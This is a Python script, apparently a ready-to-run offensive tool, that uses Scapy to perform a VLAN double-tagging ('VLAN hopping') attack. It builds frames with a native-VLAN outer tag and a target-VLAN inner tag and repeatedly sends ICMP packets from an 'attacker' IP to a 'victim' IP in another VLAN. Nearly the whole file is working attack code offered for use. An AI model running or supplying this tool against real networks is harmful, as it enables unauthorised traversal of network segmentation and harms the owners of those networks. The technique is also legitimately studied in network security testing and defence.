#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.l2 import *
from scapy.contrib.icmp_extensions import *
import argparse


L2BroadcastAddr = "FF:FF:FF:FF:FF:FF"

print (r"""

.s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.
      SS.                 SS.       SS.       SS.    SS. SS.       SS.
sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S
SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S
SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::' SS S%S S%S SS `S.S%S
 SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S
 SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;
  SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.
   `:;;:' `:;;;;;:' :;    ;:' :;    ;:' `:        `:;;:'`::' :;    ;:'
    """)
print ("VLAN Double Tagging inject tool. Jump into another VLAN!")
print("\nAuthor: Magama Bazarov, <in9uz@protonmail.com>\n")


def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Specify your network interface")
    parser.add_argument("--nativevlan", dest="nativevlan", type=int, required=True, help="Specify the Native VLAN ID")
    parser.add_argument("--targetvlan", dest="targetvlan", type=int, required=True, help="Specity the target VLAN ID for attack")
    parser.add_argument("--victim", dest="victim", type=str, required=True, help="Specity the target IP")
    parser.add_argument("--attacker", dest="attacker", type=str, required=True, help="Specify the attacker IP")
    args = parser.parse_args()

    return args





def inject(interface, nativevlan, targetvlan, victim, attacker):
    L2frame = Ether(dst=L2BroadcastAddr)
    first_DOT1Q = Dot1Q(vlan=args.nativevlan, type=0x08100)
    second_DOT1Q = Dot1Q(vlan=args.targetvlan, type=0x0800)
    L3packet = IP(src=args.attacker, dst=args.victim)
    icmp_layer = ICMP(type="echo-request")
    evil = L2frame / first_DOT1Q / second_DOT1Q / L3packet / icmp_layer
    print ("[+] Starting a jump to another VLAN, sending test ICMP requests to the destination...")
    sendp(evil, iface=args.interface, loop=1, inter=3, verbose=1)







args = take_arguments()
inject(args.interface, args.nativevlan, args.targetvlan, args.victim, args.attacker)
